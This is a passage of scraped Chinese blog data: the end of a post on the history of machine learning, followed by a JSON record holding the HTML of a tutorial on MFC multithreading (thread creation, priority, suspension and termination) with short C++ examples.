Ng和诸多大师结合了许多不同的发现。下面我列举了一些机器学习领域重要的概念（我猜，我将专门为深度学习写一篇文章）;</p>\n<ul>\n<li>GPU编程</li>\n<li>卷积NN [18] [20] [40]</li>\n<li>解卷积网络[21]</li>\n<li>算法优化</li>\n<li>随机梯度下降[19] [22]</li>\n<li>BFGS和L-BFGS [23]</li>\n<li>共轭梯度下降[24]</li>\n<li>反向传播[40] [19]</li>\n<li>整流器单元</li>\n<li>稀疏性[15] [16]</li>\n<li>Dropout网 [26]</li>\n<li>Maxout网[25]</li>\n<li>无监督的NN模型[14]</li>\n<li>深度信念网[13]</li>\n<li>堆叠式自动编码器[16] [39]</li>\n<li>去噪NN模型[17]</li>\n</ul>\n<p>结合所有这些想法和未列出的想法，NN 模型能够在对象识别、语音识别、NLP等不同的任务中击败之前的技术。但是应该注意的是，这并不意味着其他ML流派的结束。虽然深度学习的成功故事还在接二连三的上演，但是它在训练成本和调整模型的外部参数方面还有很多争议。此外，由于其简单性，SVM的使用依然非常普遍。 （据说可能会引起很大争议）</p>\n<p>在结束之前，我需要再介绍一个比较前沿的 ML 趋势。随着WWW和社交媒体的发展，一个新的术语——大数据出现了，并大大影响了ML研究。由于大数据的数据规模都很大，许多强大的ML算法在相当多的系统中（当然对大型技术公司来说不是这样）是无用的。因此，研究人员提出了一套新的简单模型——dubbed Bandit Algorithms，被称为强盗算法[27 – 38]（通常都基于在线学习），使学习更容易，适应大规模问题。</p>\n<p>我只是总结了机器学习的发展史。如果你发现错误，不足或没有添加引用的地方，请不要犹豫，可以通过各种方式告诉我。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113180\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113180votetotal\">4</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113180\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 8 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 8 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland\">李大萌</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            码农一枚        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/nemoland\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/nemoland/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 25</a> · <a title=\"QQ：727231337\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：qq_nemo\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "4"}
{"tags": "C/C++", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/05/2b6a906c5f04bf387ccf049e4a20b855.png"], "title": "多线程编程基础知识", "fav_nums": 2, "url": "http://blog.jobbole.com/113186/", "create_date": "2017/12/05", "url_object_id": "81659ccadebd3390ce4d7edbf5b6047d", "comment_nums": 0, "front_image_path": "full/b7ccda3a3b2f793882325f528f2211d69c7b4f95.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/cy163/archive/2006/11/02/547428.html\">cy163</a>   </div><p>当前流行的Windows操作系统能同时运行几个程序(独立运行的程序又称之为进程)，对于同一个程序，它又可以分成若干个独立的执行流，我们称之为线程，线程提供了多任务处理的能力。用进程和线程的观点来研究软件是当今普遍采用的方法，进程和线程的概念的出现，对提高软件的并行性有着重要的意义。现在的大型应用软件无一不是多线程多任务处理，单线程的软件是不可想象的。因此掌握多线程多任务设计方法对每个程序员都是必需要掌握的。本实例针对多线程技术在应用中经常遇到的问题，如线程间的通信、同步等，分别进行探讨，并利用多线程技术进行线程之间的通信，实现了数字的简单排序。</p>\n<h1>一、 实现方法</h1>\n<h2>1、理解线程</h2>\n<p>要讲解线程，不得不说一下进程，进程是应用程序的执行实例，每个进程是由私有的虚拟地址空间、代码、数据和其它系统资源组成。进程在运行时创建的资源随着进程的终止而死亡。线程的基本思想很简单，它是一个独立的执行流，是进程内部的一个独立的执行单元，相当于一个子程序，它对应于Visual C++中的CwinThread类对象。单独一个执行程序运行时，缺省地包含的一个主线程，主线程以函数地址的形式出现，提供程序的启动点，如main（）或WinMain（）函数等。当主线程终止时，进程也随之终止。根据实际需要，应用程序可以分解成许多独立执行的线程，每个线程并行的运行在同一进程中。</p>\n<p>一个进程中的所有线程都在该进程的虚拟地址空间中，使用该进程的全局变量和系统资源。操作系统给每个线程分配不同的CPU时间片，在某一个时刻，CPU只执行一个时间片内的线程，多个时间片中的相应线程在CPU内轮流执行，由于每个时间片时间很短，所以对用户来说，仿佛各个线程在计算机中是并行处理的。操作系统是根据线程的优先级来安排CPU的时间，优先级高的线程优先运行，优先级低的线程则继续等待。</p>\n<p>线程被分为两种：用户界面线程和工作线程（又称为后台线程）。用户界面线程通常用来处理用户的输入并响应各种事件和消息，其实，应用程序的主执行线程CWinAPP对象就是一个用户界面线程，当应用程序启动时自动创建和启动，同样它的终止也意味着该程序的结束，进程终止。工作线程用来执行程序的后台处理任务，比如计算、调度、对串口的读写操作等，它和用户界面线程的区别是它不用从CWinThread类派生来创建，对它来说最重要的是如何实现工作线程任务的运行控制函数。工作线程和用户界面线程启动时要调用同一个函数的不同版本；最后需要读者明白的是，一个进程中的所有线程共享它们父进程的变量，但同时每个线程可以拥有自己的变量。</p>\n<h2>2、线程的管理和操作</h2>\n<h3>（一）线程的启动</h3>\n<p>创建一个用户界面线程，首先要从类CwinThread产生一个派生类，同时必须使用DECLARE_DYNCREATE和IMPLEMENT_DYNCREATE来声明和实现这个CwinThread派生类。第二步是根据需要重载该派生类的一些成员函数如：ExitInstance（）、InitInstance（）、OnIdle（）、PreTranslateMessage（）等函数。最后调用AfxBeginThread()函数的一个版本：CWinThread* AfxBeginThread( CRuntimeClass* pThreadClass, int nPriority = THREAD_PRIORITY_NORMAL, UINT nStackSize = 0, DWORD dwCreateFlags = 0, LPSECURITY_ATTRIBUTES lpSecurityAttrs = NULL ) 启动该用户界面线程，其中第一个参数为指向定义的用户界面线程类指针变量，第二个参数为线程的优先级，第三个参数为线程所对应的堆栈大小，第四个参数为线程创建时的附加标志，缺省为正常状态，如为CREATE_SUSPENDED则线程启动后为挂起状态。</p>\n<p>对于工作线程来说，启动一个线程，首先需要编写一个希望与应用程序的其余部分并行运行的函数如Fun1()，接着定义一个指向CwinThread对象的指针变量*pThread,调用AfxBeginThread(Fun1,param,priority)函数，返回值赋给pThread变量的同时一并启动该线程来执行上面的Fun1（）函数，其中Fun1是线程要运行的函数的名字，也既是上面所说的控制函数的名字，param是准备传送给线程函数Fun1的任意32位值，priority则是定义该线程的优先级别，它是预定义的常数，读者可参考MSDN。</p>\n<h3>（二）线程的优先级</h3>\n<p>以下的CwinThread类的成员函数用于线程优先级的操作：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b24561384893\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nint GetThreadPriority（）；\r\nBOOL SetThradPriority（）(int nPriority)；</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b24561384893-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b24561384893-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b24561384893-1\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">GetThreadPriority</span>（）；</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b24561384893-2\"><span class=\"crayon-t\">BOOL</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SetThradPriority</span>（）<span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nPriority</span><span class=\"crayon-sy\">)</span>；</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>上述的二个函数分别用来获取和设置线程的优先级，这里的优先级，是相对于该线程所处的优先权层次而言的，处于同一优先权层次的线程，优先级高的线程先运行；处于不同优先权层次上的线程，谁的优先权层次高，谁先运行。至于优先级设置所需的常数，自己参考MSDN就可以了，要注意的是要想设置线程的优先级，这个线程在创建时必须具有THREAD_SET_INFORMATION访问权限。对于线程的优先权层次的设置，CwinThread类没有提供相应的函数，但是可以通过Win32 SDK函数GetPriorityClass（）和SetPriorityClass（）来实现。</p>\n<h3>（三）线程的悬挂和恢复</h3>\n<p>CWinThread类中包含了应用程序悬挂和恢复它所创建的线程的函数，其中SuspendThread（）用来悬挂线程，暂停线程的执行；ResumeThread（）用来恢复线程的执行。如果你对一个线程连续若干次执行SuspendThread（），则需要连续执行相应次的ResumeThread（）来恢复线程的运行。</p>\n<h3>（四）结束线程</h3>\n<p>终止线程有三种途径，线程可以在自身内部调用AfxEndThread()来终止自身的运行；可以在线程的外部调用BOOL TerminateThread( HANDLE hThread, DWORD dwExitCode )来强行终止一个线程的运行，然后调用CloseHandle（）函数释放线程所占用的堆栈；第三种方法是改变全局变量，使线程的执行函数返回，则该线程终止。下面以第三种方法为例，给出部分代码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b2f681698292\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n//////CtestView message handlers\r\n/////Set to True to end thread\r\nBool bend=FALSE;//定义的全局变量，用于控制线程的运行；\r\n//The Thread Function；\r\nUINT ThreadFunction(LPVOID pParam)//线程函数\r\n{\r\n　while(!bend)\r\n　{\r\n　　Beep(100,100);\r\n　　Sleep(1000);\r\n　}\r\n　return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b2f681698292-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b2f681698292-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b2f681698292-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b2f681698292-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b2f681698292-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b2f681698292-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b2f681698292-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b2f681698292-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b2f681698292-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b2f681698292-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b2f681698292-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b2f681698292-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b2f681698292-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b2f681698292-1\"><span class=\"crayon-c\">//////CtestView message handlers</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b2f681698292-2\"><span class=\"crayon-c\">/////Set to True to end thread</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b2f681698292-3\"><span class=\"crayon-t\">Bool</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bend</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">FALSE</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">//定义的全局变量，用于控制线程的运行；</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b2f681698292-4\"><span class=\"crayon-c\">//The Thread Function；</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b2f681698292-5\"><span class=\"crayon-e\">UINT </span><span class=\"crayon-e\">ThreadFunction</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">LPVOID </span><span class=\"crayon-v\">pParam</span><span class=\"crayon-sy\">)</span><span class=\"crayon-c\">//线程函数</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b2f681698292-6\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b2f681698292-7\">　<span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">bend</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b2f681698292-8\">　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b2f681698292-9\">　　<span class=\"crayon-e\">Beep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b2f681698292-10\">　　<span class=\"crayon-e\">Sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b2f681698292-11\">　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b2f681698292-12\">　<span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b2f681698292-13\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b33611277691\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCwinThread *pThread;\r\nHWND hWnd;\r\nVoid CtestView::OninitialUpdate()\r\n{ \r\n　hWnd=GetSafeHwnd();\r\n　pThread=AfxBeginThread(ThradFunction,hWnd);//启动线程\r\n　pThread-&gt;m_bAutoDelete=FALSE;//线程为手动删除\r\n　Cview::OnInitialUpdate();\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b33611277691-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b33611277691-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b33611277691-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b33611277691-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b33611277691-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b33611277691-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b33611277691-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b33611277691-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b33611277691-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b33611277691-1\"><span class=\"crayon-e \">CwinThread *</span><span class=\"crayon-v\">pThread</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b33611277691-2\"><span class=\"crayon-e\">HWND </span><span class=\"crayon-v\">hWnd</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b33611277691-3\"><span class=\"crayon-t\">Void</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CtestView</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">OninitialUpdate</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b33611277691-4\"><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b33611277691-5\">　<span class=\"crayon-v\">hWnd</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">GetSafeHwnd</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b33611277691-6\">　<span class=\"crayon-v\">pThread</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">AfxBeginThread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ThradFunction</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">hWnd</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">//启动线程</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b33611277691-7\">　<span class=\"crayon-v\">pThread</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">m_bAutoDelete</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">FALSE</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">//线程为手动删除</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b33611277691-8\">　<span class=\"crayon-v\">Cview</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">OnInitialUpdate</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b33611277691-9\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b37314983659\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nVoid CtestView::OnDestroy()\r\n{\r\n　bend=TRUE;//改变变量，线程结束\r\n　WaitForSingleObject(pThread-&gt;m_hThread,INFINITE);//等待线程结束\r\n　delete pThread;//删除线程\r\n　Cview::OnDestroy();\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b37314983659-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b37314983659-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b37314983659-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b37314983659-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b37314983659-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b37314983659-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b37314983659-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b37314983659-1\"><span class=\"crayon-t\">Void</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CtestView</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">OnDestroy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line 